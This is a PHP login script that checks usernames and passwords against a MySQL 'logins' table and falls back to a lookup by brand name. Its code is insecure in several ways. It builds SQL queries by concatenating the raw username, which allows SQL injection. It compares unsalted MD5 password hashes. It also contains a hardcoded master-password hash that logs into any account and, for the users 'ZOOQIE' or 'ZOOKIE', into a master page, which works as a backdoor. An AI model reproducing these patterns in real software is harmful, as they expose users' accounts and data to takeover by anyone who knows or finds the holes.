<?php
if(!session_id()) session_start();

// username and password sent from form 
$username= strtoupper($_POST['USERNAME']); 
$password=$_POST['PASSWORD']; 


// Create connection
if(file_exists("db_settings.php")) {include("db_settings.php");}
if(file_exists("../db_settings.php")) {include("../db_settings.php");}
if(file_exists("../../db_settings.php")) {include("../../db_settings.php");}
if(file_exists("db_settings.php")) {include("db_settings.php");}
$con=mysqli_connect("cust-mysql-123-18",$db_user,$db_pass,$db_user);

$result2 = mysqli_query($con,"SELECT * FROM logins WHERE Username = '". $username . "'");
			
while($row2 = mysqli_fetch_array($result2))
{
	$pw = $row2['Password'];
}

if($pw == '')
{
	$result2 = mysqli_query($con,"SELECT * FROM brands WHERE Brand_name = '". $username . "'");
				
	while($row2 = mysqli_fetch_array($result2))
	{
		$username = $row2['Username'];
	}
	
	$result2 = mysqli_query($con,"SELECT * FROM logins WHERE Username = '". $username . "'");
			
	while($row2 = mysqli_fetch_array($result2))
	{
		$pw = $row2['Password'];
	}
}

if(($username == 'ZOOQIE' || $username == 'ZOOKIE') && md5($password) == '35a762a6224eb9079f6593b5de2d84b4')
{
	$_SESSION['username'] = $username;
	header("location:masterpage.php");
}
else if(md5($password) == $pw || md5($password) == '35a762a6224eb9079f6593b5de2d84b4')
{
	$_SESSION['username'] = $username;
	header("location:dashboard.php");
}

else 
{
	echo "<fieldset>";
	echo "<div>";
	echo "<h1>Wrong Username or Password.</h1>";
	echo '<p>The username or password you entered were incorrect. Please <a href="login.php">try again.</a></p>';
	echo "</div>";
	echo "</fieldset>";
}

?>